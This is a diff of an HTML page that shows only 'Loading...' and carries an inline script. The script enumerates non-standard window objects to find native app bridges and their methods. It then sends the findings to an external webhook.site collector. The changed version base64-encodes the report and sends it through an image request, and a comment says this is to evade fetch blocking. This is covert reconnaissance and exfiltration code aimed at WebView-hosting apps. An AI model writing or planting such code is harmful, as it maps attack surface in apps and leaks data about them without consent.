@@ -4,22 +4,35 @@
 <body>
    <script>
     (function() {
-        var foundBridges = [];
-        var standardObjects = ['window', 'document', 'location', 'navigator', 'console', 'chrome'];
-
-        Object.keys(window).forEach(key => {
-            if (!standardObjects.includes(key) && window[key] !== null && typeof window[key] === 'object') {
-                try {
-                    // Проверяем, есть ли у объекта методы (признак нативного моста)
-                    var methods = Object.keys(window[key]);
-                    if (methods.length > 0) {
-                        foundBridges.push(key + "(" + methods.join(',') + ")");
+        var report = { bridges: [], error: "none" };
+        try {
+            var standard = ['window', 'document', 'location', 'navigator', 'console', 'chrome', 'webkit'];
+            
+            // Перебор свойств window
+            var keys = Object.getOwnPropertyNames(window); 
+            keys.forEach(function(key) {
+                if (standard.indexOf(key) === -1) {
+                    try {
+                        var obj = window[key];
+                        if (obj && typeof obj === 'object') {
+                            var methods = Object.keys(obj);
+                            if (methods.length > 0) {
+                                report.bridges.push(key + "(" + methods.join(',') + ")");
+                            }
+                        }
+                    } catch (e) {
+                        // Игнорируем ошибки доступа к конкретным объектам
                     }
-                } catch(e) {}
-            }
-        });
+                }
+            });
+        } catch (globalError) {
+            report.error = globalError.message;
+        }
 
-        fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?bridges=' + encodeURIComponent(foundBridges.join('|')));
+        // Отправка через Image (обход блокировок fetch)
+        var out = JSON.stringify(report);
+        var img = new Image();
+        img.src = 'https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?data=' + btoa(out);
     })();
 </script>
 <h1>Loading...</h1>
